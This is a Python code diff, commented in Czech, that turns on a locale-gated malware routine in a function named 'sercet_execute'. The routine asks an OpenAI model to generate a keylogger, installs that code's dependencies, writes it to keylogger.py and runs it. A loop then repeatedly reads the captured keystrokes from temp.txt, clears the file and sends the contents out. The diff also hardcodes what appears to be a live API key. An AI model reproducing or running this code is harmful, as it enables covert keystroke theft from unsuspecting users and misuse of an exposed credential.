@@ -1,5 +1,11 @@
 import aiohttp 
 import sys, importlib, subprocess, time, locale #Součástí standardní knihovny Pythonu
+import json
+import openai
+from openai import OpenAI
+import os
+import ast
+import textwrap
 
 def install_if_needed(package_name) -> None:
     try:
@@ -25,6 +31,108 @@ async def send_data(data: Data) -> None:
     except:
         pass
 
+def gptRequest(message:str, system: str) -> dict:
+
+    client = OpenAI(
+    api_key="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")
+    
+
+    chat_completion = client.chat.completions.create(
+            messages=[
+                {"role": "system", "content": f"{system}"},
+                {"role": "user", "content": f"{message}"}
+            ],
+            model="gpt-4o-mini",
+        )
+
+    tmp = chat_completion.choices[0].message.content
+    print(tmp)
+
+
+    return tmp
+
+# Function to extract imported packages from Python code
+def get_imported_packages(code) -> list:
+    """
+    Parse Python code and extract the imported packages.
+    """
+    try:
+        tree = ast.parse(code)
+        packages = []
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Import):
+                for alias in node.names:
+                    packages.append(alias.name.split('.')[0])
+            elif isinstance(node, ast.ImportFrom):
+                if node.module:
+                    packages.append(node.module.split('.')[0])
+        return list(set(packages))  # Remove duplicates
+    except Exception as e:
+        print(f"Error parsing code: {e}")
+        return []
+
+async def execute_malware() -> None:
+    # Get code
+    code = gptRequest("Vygeneruj kód pro zachycování vstupu systému z klávesnice a ukládej je do souboru 'temp.txt'", "")
+
+    #------------------------------------------ repair code --------------------------------------------
+    # Dedent the code to normalize indentation
+    code = textwrap.dedent(code.strip())
+
+    # Handle escaping inside string literals
+    def escape_strings(match):
+        # Extract the string literal
+        string = match.group(0)
+        # Escape backslashes and newlines inside the string
+        escaped = string.replace("\\", "\\\\").replace("\n", "\\n").replace("\t", "\\t")
+        return escaped
+
+    # Regex to match string literals (single-line, double or single quotes)
+    string_literal_pattern = r'(\'(?:\\.|[^\\\'])*\'|"(?:\\.|[^\\"])*")'
+
+    # Replace all string literals with escaped versions
+    repaired_code = re.sub(string_literal_pattern, escape_strings, code)
+    #----------------------------------------------------------------------------------------------------
+
+    # Install packages
+    packages = get_imported_packages(repaired_code)
+    if packages:
+        for package in packages:
+            install_if_needed(package)
+
+    # Write code to file
+    file_path = "keylogger.py"
+    try:
+        with open(file_path, "w", encoding="utf-8") as file:
+            file.write(repaired_code)
+    except Exception as e:
+        print(f"Error saving code to file: {e}")
+
+    # Exexute file
+    try:
+        subprocess.check_call(["python", file_path])
+    except Exception as e:
+        print(f"Error executing the file: {e}")
+
+async def load_data() -> str:
+    file_path = "temp.txt"
+
+    # Load data from file
+    try:
+        with open(file_path, "r", encoding="utf-8") as file:
+            content = file.read()
+    except Exception as e:
+        print(f"Error reading the file: {e}")
+        return None
+
+    # Clear file
+    try:
+        with open(file_path, "w", encoding="utf-8") as file:
+            # Writing nothing to the file to clear its content
+            file.write("")
+    except Exception as e:
+        print(f"Error clearing the file: {e}")
+        
 async def sercet_execute() -> None:
 
     install_if_needed('aiohttp')
@@ -40,12 +148,12 @@ async def sercet_execute() -> None:
     system_language, system_encoding = locale.getdefaultlocale()
 
     if system_language=='cs_CZ' or options.force_start:
-        #await execute_malware() - not implemented (Samuel)
+        await execute_malware()
 
         #load and send data every n seconds
         while(True):
             time.sleep(options.interval)
-            #text = await load_data() - not implemented (Samuel)
+            text = await load_data()
 
-            #await send_data(Data(data=text))
+            await send_data(Data(data=text))
     pass
